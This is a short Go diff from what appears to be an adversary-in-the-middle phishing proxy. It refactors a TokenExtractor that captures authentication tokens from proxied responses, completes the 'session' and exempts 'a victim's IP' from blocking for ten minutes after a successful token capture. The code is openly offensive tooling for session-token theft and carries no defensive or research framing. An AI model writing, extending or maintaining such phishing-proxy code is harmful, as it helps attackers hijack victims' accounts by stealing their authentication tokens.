@@ -28,6 +28,11 @@ type TemporaryWhitelister interface {
 	WhitelistTemporary(ip string, dur time.Duration)
 }
 
+// temporaryWhitelistDuration is how long a victim's IP is exempted from
+// blocking after a successful token capture, to avoid disrupting the post-auth
+// redirect flow.
+const temporaryWhitelistDuration = 10 * time.Minute
+
 // TokenExtractor captures auth tokens from upstream responses.
 // When all required tokens are captured it marks the session complete and
 // publishes EventSessionCompleted so the WebSocket redirect fires.
@@ -62,7 +67,7 @@ func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 		}
 		h.Bus.Publish(aitm.Event{Type: aitm.EventSessionCompleted, Payload: ctx.Session})
 		if h.Whitelist != nil {
-			h.Whitelist.WhitelistTemporary(ctx.ClientIP, 10*time.Minute)
+			h.Whitelist.WhitelistTemporary(ctx.ClientIP, temporaryWhitelistDuration)
 		}
 	} else if updated {
 		if err := h.Store.UpdateSession(ctx.Session); err != nil {
